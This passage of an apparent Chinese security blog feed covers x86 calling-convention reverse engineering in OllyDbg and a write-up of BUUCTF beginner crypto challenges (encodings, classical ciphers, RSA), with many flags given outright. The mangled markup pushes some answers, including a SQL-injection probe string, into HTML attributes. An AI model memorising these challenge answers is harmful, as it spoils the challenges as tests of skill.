class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>EBX             <span class="token punctuation">;</span>  将ebx也就是参数<span class="token number">1</span>放到局部变量中</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">0040102</span>E  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">0345</span> FC       ADD EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  将参数<span class="token number">2</span>与局部变量相加</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00401031</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span>                                <span class="token punctuation">;</span>  平栈</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">00401034</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>D            POP EBP                                  <span class="token punctuation">;</span>  还原到上一个函数使用的栈</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">00401035</span>  \<span class="token punctuation">.</span>  C2 <span class="token number">0800</span>       RETN <span class="token number">8</span>                                   <span class="token punctuation">;</span>  返回</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327173155533.png" alt="image-20220327173155533" /></p>
<h2 id="利用寄存器传递参数"><a class="anchor" href="#利用寄存器传递参数">#</a> 利用寄存器传递参数</h2>
<h3 id="fastcall"><a class="anchor" href="#fastcall">#</a> fastcall</h3>
<p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span>  __fastcall <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">,</span><span class="token keyword">long</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	    <span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">int</span> __fastcall <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">char</span> a<span class="token punctuation">,</span> <span class="token keyword">long</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">,</span> <span class="token keyword">int</span> d<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	   <span class="token keyword">return</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b <span class="token operator">+</span> c <span class="token operator">+</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>OD 打开：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327180829910.png" alt="image-20220327180829910" /></p>
<p>根据启动函数的规则，找到 fastcall</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327180846700.png" alt="image-20220327180846700" /></p>
<p>f9 执行到断点，f7 进入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327180943786.png" alt="image-20220327180943786" /></p>
<p>从这里看到，如果按堆栈传参来说只有俩个参数 push 4 和 push 3，而在这里的 call 它有四个参数，这里通过 fastcall 的调用约定，它前俩个参数使用的是寄存器传参，正常情况下使用的是 ecx 和 edx，而在这里使用的是 8 位的长度变量 cl，而 ecx 是 32 位的长度变量。</p>
<p>这里的前俩个参数使用寄存器传参，后俩个参数使用堆栈传参</p>
<p>f2 断点，f9 运行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327181902478.png" alt="image-20220327181902478" /></p>
<p>f7 进入函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327181951038.png" alt="image-20220327181951038" /></p>
<p>函数分析如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401017</span>  <span class="token operator">/</span>$  <span class="token number">55</span>            PUSH EBP                                 <span class="token punctuation">;</span>  函数开始</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401018</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BEC          MOV EBP<span class="token punctuation">,</span>ESP</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">0040101</span>A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>EC <span class="token number">08</span>       SUB ESP<span class="token punctuation">,</span><span class="token number">8</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">0040101</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8955</span> F8       MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>EDX             <span class="token punctuation">;</span>  将eax存到ebp<span class="token operator">-</span><span class="token number">8</span>的局部变量中</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">00401020</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">884</span>D FC       MOV BYTE PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>CL               <span class="token punctuation">;</span>  将cl存到ebp<span class="token operator">-</span><span class="token number">4</span>的局部变量中</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">00401023</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">0F</span>BE45 FC     MOVSX EAX<span class="token punctuation">,</span>BYTE PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>            <span class="token punctuation">;</span>  通过movsx将<span class="token number">8</span>位字符型的整数符号扩展到一个双字的长度</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">00401027</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">0345</span> F8       ADD EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  加法</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">0040102</span>A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">0345</span> <span class="token number">08</span>       ADD EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">0040102</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">0345</span> <span class="token number">0</span>C       ADD EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span>C<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">00401030</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BE5          MOV ESP<span class="token punctuation">,</span>EBP                              <span class="token punctuation">;</span>  还原</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">00401032</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>D            POP EBP</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">00401033</span>  \<span class="token punctuation">.</span>  C2 <span class="token number">0800</span>       RETN <span class="token number">8</span>                                   <span class="token punctuation">;</span>  函数结束</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327182411588.png" alt="image-20220327182411588" /></p>
<h3 id="this指针"><a class="anchor" href="#this指针">#</a> this 指针</h3>
<p>C++ 中类的一个操作</p>
<p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>class CSum</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>public<span class="token operator">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token keyword">int</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token comment">// 实际 Add 原型具有如下形式：Add (this,int a,int b)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>		<span class="token keyword">return</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#123;</span>     </pre></td></tr><tr><td data-num="13"></td><td><pre>	CSum sum<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	sum<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>OD 打开：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327182912587.png" alt="image-20220327182912587" /></p>
<p>找到函数和入口点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327182958916.png" alt="image-20220327182958916" /></p>
<p>控制台 main 函数有 3 个参数</p>
<p>f7 进入函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327183109344.png" alt="image-20220327183109344" /></p>
<p>可以看到三个参数，一个 ecx 寄存器传参，俩个堆栈传参</p>
<p>如下的 call 调用的就是上面源码中的类</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0040100</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">10000000</span>   CALL VF<span class="token punctuation">.</span><span class="token number">00401020</span>                         <span class="token punctuation">;</span> \VF<span class="token punctuation">.</span><span class="token number">00401020</span></pre></td></tr></table></figure><p>class CSum：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>class CSum</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>public<span class="token operator">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	<span class="token keyword">int</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token comment">// 实际 Add 原型具有如下形式：Add (this,int a,int b)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>		<span class="token keyword">return</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>f7 进入如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401020</span>  <span class="token operator">/</span>$  <span class="token number">55</span>            PUSH EBP</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401021</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BEC          MOV EBP<span class="token punctuation">,</span>ESP</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401023</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">51</span>            PUSH ECX</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401024</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">894</span>D FC       MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>ECX <span class="token operator">|</span>ecx就是this指针，将this指针放到ebp<span class="token operator">-</span><span class="token number">4</span>的局部变量中</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">00401027</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 <span class="token number">08</span>       MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">0040102</span>A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">0345</span> <span class="token number">0</span>C       ADD EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span>C<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">0040102</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BE5          MOV ESP<span class="token punctuation">,</span>EBP</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">0040102F</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>D            POP EBP</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00401030</span>  \<span class="token punctuation">.</span>  C2 <span class="token number">0800</span>       RETN <span class="token number">8</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/DB317EB71685A21C9A2B761920DC4D4D.gif" alt="img-DB317EB71685A21C9A2B761920DC4D4D" /></p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>Buu-Cr刷题记录</title>
    <url>/article/fb6d43a6.html</url>
    <content><![CDATA[<p>buu 站点：<span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2Vz">https://buuoj.cn/challenges</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/img.php" alt="img" /></p>
<h2 id="md5"><a class="anchor" href="#md5">#</a> MD5</h2>
<p>注意：得到的 flag 请包上 flag {} 提交</p>
<p>打开附件中的题目</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/ea15d20766f64361ee0ea6e8079e38a.png" alt="ea15d20766f64361ee0ea6e8079e38a" /></p>
<p>得到密码用 md5 解密</p>
<p>md5 解密网址：<span class="exturl" data-url="aHR0cDovL3d3dy5zb21kNS5jb20=">www.somd5.com</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/67ae8265daa7a3cb1a8362810c6886e.png" alt="67ae8265daa7a3cb1a8362810c6886e" /></p>
<p>解密得到 flag：admin1</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/0a0901e3da76f40839545ba6bbc062f.png" alt="0a0901e3da76f40839545ba6bbc062f" /></p>
<p admin1="">提交 flag</p>
<h2 id="一眼就解密"><a class="anchor" href="#一眼就解密">#</a> 一眼就解密</h2>
<p>下面的字符串解密后便能获得 flag：ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30= 注意：得到的 flag 请包上 flag {} 提交</p>
<p>观察密文，可以看到有一个 =，这是 base 64 的标志，三个字节为一组，需要 4 个 base 64 编码来表达，不够的编码用 = 来补充<br />
所以用 base 64 来解密</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/c60734d313f6937d8b62458afeb13d1.png" alt="c60734d313f6937d8b62458afeb13d1" /></p>
<p>base64 解码网址：<span class="exturl" data-url="aHR0cHM6Ly9iYXNlNjQudXMv">https://base64.us/</span></p>
<p THE_FLAG_OF_THIS_STRING="">得到 flag</p>
<h2 id="url编码"><a class="anchor" href="#url编码">#</a> Url 编码</h2>
<p>注意：得到的 flag 请包上 flag {} 提交</p>
<p>打开附件，得到编码</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/fbd89b9db30094785b3ed6449495892.png" alt="fbd89b9db30094785b3ed6449495892" /></p>
<p and="" 1="1">使用 HackBar 解码得到 flag</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/e25a3179fa507542ca9c0496ffc5d9b.png" alt="e25a3179fa507542ca9c0496ffc5d9b" /></p>
<h2 id="看我回旋踢"><a class="anchor" href="#看我回旋踢">#</a> 看我回旋踢</h2>
<p>注意：得到的 flag 请包上 flag {} 提交</p>
<p>打开题目得到</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/4a4da212440b7a2c867258134a6eb05.png" alt="4a4da212440b7a2c867258134a6eb05" /></p>
<p>直接百度可疑字符：synt 编码</p>
<p>看到搜索栏里跳出 rot13</p>
<p>在线解密（贼好用）： <code>http://www.rot13.de/index.php</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/ce0b0a94f18276ff9c00c6841aeafde.png" alt="ce0b0a94f18276ff9c00c6841aeafde" /> 得到 flag：</p>
<pre><code>flag&#123;5cd1004d-86a5-46d8-b720-beb5ba0417e1&#125;
</code></pre>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/ec64831708fa324811fd072caadad4c.png" alt="ec64831708fa324811fd072caadad4c" /></p>
<h2 id="摩丝"><a class="anchor" href="#摩丝">#</a> 摩丝</h2>
<p>注意：得到的 flag 请包上 flag {} 提交</p>
<p>打开附件：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330194138615.png" alt="image-20220330194138615" /></p>
<p>摩斯解码</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330194227174.png" alt="image-20220330194227174" /></p>
<p ILOVEYOU="">得到 flag</p>
<h2 id="password"><a class="anchor" href="#password">#</a> password</h2>
<p>注意：得到的 flag 请包上 flag {} 提交</p>
<p>打开题目</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/2f21e6456c601e1e735a67f302566ac.png" alt="2f21e6456c601e1e735a67f302566ac" /></p>
<p zs19900315="">因为 key 里面又十个 x，所以不妨猜测 flag 为 flag</p>
<h2 id="变异凯撒"><a class="anchor" href="#变异凯撒">#</a> 变异凯撒</h2>
<p>注意：得到的 flag 请包上 flag {} 提交</p>
<p>附件打开：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330194708756.png" alt="image-20220330194708756" /></p>
<p>直接凯撒解密无果，做以下尝试</p>
<blockquote>
<p>afZ_ -&gt; flag<br />
rc -&gt; {}</p>
</blockquote>
<p>其中 ASCII 码值的变化为</p>
<table>
<thead>
<tr>
<th style="text-align:left"></th>
<th style="text-align:left"></th>
<th style="text-align:left">差值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">a</td>
<td style="text-align:left">f</td>
<td style="text-align:left">5</td>
</tr>
<tr>
<td style="text-align:left">f</td>
<td style="text-align:left">l</td>
<td style="text-align:left">6</td>
</tr>
<tr>
<td style="text-align:left">Z</td>
<td style="text-align:left">a</td>
<td style="text-align:left">7</td>
</tr>
<tr>
<td style="text-align:left">_</td>
<td style="text-align:left">g</td>
<td style="text-align:left">8</td>
</tr>
</tbody>
</table>
<p>所以解密方法已经很明显了～</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>c <span class="token operator">=</span> <span class="token string">"afZ_r9VYfScOeO_UL^RWUc"</span></pre></td></tr><tr><td data-num="2"></td><td><pre>move <span class="token operator">=</span> <span class="token number">5</span></pre></td></tr><tr><td data-num="3"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> move<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    move <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><p>结果为 <code>flag&#123;Caesar_variation&#125;</code></p>
<h2 id="quoted-printable"><a class="anchor" href="#quoted-printable">#</a> Quoted-printable</h2>
<p>注意：得到的 flag 请包上 flag {} 提交</p>
<p>打开题目</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/60ae59cc545efe1a76d7fc26bceb4b6.png" alt="60ae59cc545efe1a76d7fc26bceb4b6" /></p>
<p>根据题目指示可以发现是 Quoted-printable 编码</p>
<p>解密网站：<span class="exturl" data-url="aHR0cDovL3d3dy5teGN6Lm5ldC90b29scy9RdW90ZWRQcmludGFibGUuYXNweA==">http://www.mxcz.net/tools/QuotedPrintable.aspx</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/cf370d7d98849e63975f206fef87ddd.png" alt="cf370d7d98849e63975f206fef87ddd" /></p>
<p 那你也很棒哦="">解密结果套上 flag 就是 flag</p>
<h2 id="rabbit"><a class="anchor" href="#rabbit">#</a> Rabbit</h2>
<p>注意：得到的 flag 请包上 flag {} 提交</p>
<p>打开题目</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/926199ff4567a714617e99aba89fa9a.png" alt="926199ff4567a714617e99aba89fa9a" /></p>
<p>根据提示搜索 rabbit</p>
<p>解码网站：<span class="exturl" data-url="aHR0cDovL3d3dy5qc29ucy5jbi9yYWJiaXRlbmNyeXB0Lw==">http://www.jsons.cn/rabbitencrypt/</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/2c2f07a0b410a118e1e7edf3dc20d15.png" alt="2c2f07a0b410a118e1e7edf3dc20d15" /></p>
<p>得到 flag</p>
<h2 id="篱笆墙的影子"><a class="anchor" href="#篱笆墙的影子">#</a> 篱笆墙的影子</h2>
<p>星星还是那颗星星哟 月亮还是那个月亮 山也还是那座山哟 梁也还是那道梁 碾子是碾子 缸是缸哟 爹是爹来娘是娘 麻油灯呵还吱吱响 点的还是那么丁点亮 哦哦 注意：得到的 flag 请包上 flag {} 提交</p>
<p>打开题目</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/a1878a926bae31705da18ebf5d7c270.png" alt="a1878a926bae31705da18ebf5d7c270" /></p>
<p>有题目得，解为 flag {} 的形式，所以 felhaagv 解密为 flag 的形式，所以可以看出该栅栏密码为两行</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>f l a g</pre></td></tr><tr><td data-num="2"></td><td><pre>e h a <span class="token function">v</span></pre></td></tr></table></figure><p wethinkwehavetheflag="">所以写出剩下的，解出密码为：flag</p>
<h2 id="rsa"><a class="anchor" href="#rsa">#</a> RSA</h2>
<p>注意：得到的 flag 请 将 noxCTF 替换为 flag ，格式为 flag {} 提交。</p>
<p>打开题目</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/d6d55be98a5be6e3197f3ccb7096453.png" alt="d6d55be98a5be6e3197f3ccb7096453" /></p>
<p>此时可以利用工具 RSA-Tool2 by tE</p>
<p>先将 e,p,q 输入进去，再点击 Calc.D, 获得 d（给出 p,q,e 的话直接填入，再点击 Calc.D, 获得 d）<br />
（注：给出的是 n 和 e 的话，输入 n 和 e，点击 Factor N (分解)，得到 p,q, 再重复上一步步就能得到 d 了）<br />
Public Exponent 这里要使用 16 进制的数，如果公钥 e=17 的话，就应该填入十六进制的 11</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/a1ce8a388bc77b680a563fa990dad41.png" alt="a1ce8a388bc77b680a563fa990dad41" /></p>
<h2 id="丢失的md5"><a class="anchor" href="#丢失的md5">#</a> 丢失的 MD5</h2>
<p>注意：得到的 flag 请包上 flag {} 提交</p>
<p>打开题目</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/c8e9e38d7307dbd8c664ffac5f058c2.png" alt="c8e9e38d7307dbd8c664ffac5f058c2" /></p>
<p e9032994dabac08080091151380478a2="">得到 md5.py 脚本，运行脚本得到：flag</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/c2251b43ce5078a32fa14956fe53e3a.png" alt="c2251b43ce5078a32fa14956fe53e3a" /></p>
<h2 id="alice与bob"><a class="anchor" href="#alice与bob">#</a> Alice 与 Bob</h2>
<p>密码学历史中，有两位知名的杰出人物，Alice 和 Bob。他们的爱情经过置换和轮加密也难以混淆，即使是没有身份认证也可以知根知底。就像在数学王国中的素数一样，孤傲又热情。下面是一个大整数：98554799767, 请分解为两个素数，分解后，小的放前面，大的放后面，合成一个新的数字，进行 md5 的 32 位小写哈希，提交答案。 注意：得到的 flag 请包上 flag {} 提交</p>
<p>对数据进行分解</p>
<p>素数分界网站：<span class="exturl" data-url="aHR0cDovL3Rvb2xzLmpiNTEubmV0L2ppc3VhbnFpL2ZhY3Rvcl9jYWxj">http://tools.jb51.net/jisuanqi/factor_calc</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/2806d4db2224f02de05fc64463352d3.png" alt="2806d4db2224f02de05fc64463352d3" /></p>
<p>按要求组成新的数字 101999966233，并对其进行 md5 的 32 位小写哈希加密得到 flag</p>
<p>加密网站：<span class="exturl" data-url="aHR0cHM6Ly93d3cucXF4aXV6aS5jbi9iaWFubWEvbWQ1Lmh0bQ==">https://www.qqxiuzi.cn/bianma/md5.htm</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/13978129ed89d3c1c1b2d75c295045c.png" alt="13978129ed89d3c1c1b2d75c295045c" /></p>
<h2 id="rsarsa"><a class="anchor" href="#rsarsa">#</a> rsarsa</h2>
<p>注意：得到的 flag 请包上 flag {} 提交</p>
<p>打开题目</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/fa6528680425c868e4a4be5a380bb1f.png" alt="fa6528680425c868e4a4be5a380bb1f" /></p>
<p>编写脚本解密</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>e <span class="token operator">=</span> <span class="token number">65537</span></pre></td></tr><tr><td data-num="2"></td><td><pre>p <span class="token operator">=</span> <span class="token number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></pre></td></tr><tr><td data-num="3"></td><td><pre>q <span class="token operator">=</span><span class="token number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></pre></td></tr><tr><td data-num="4"></td><td><pre>n <span class="token operator">=</span> p<span class="token operator">*</span>q</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#密文</span></pre></td></tr><tr><td data-num="6"></td><td><pre>C <span class="token operator">=</span> <span class="token 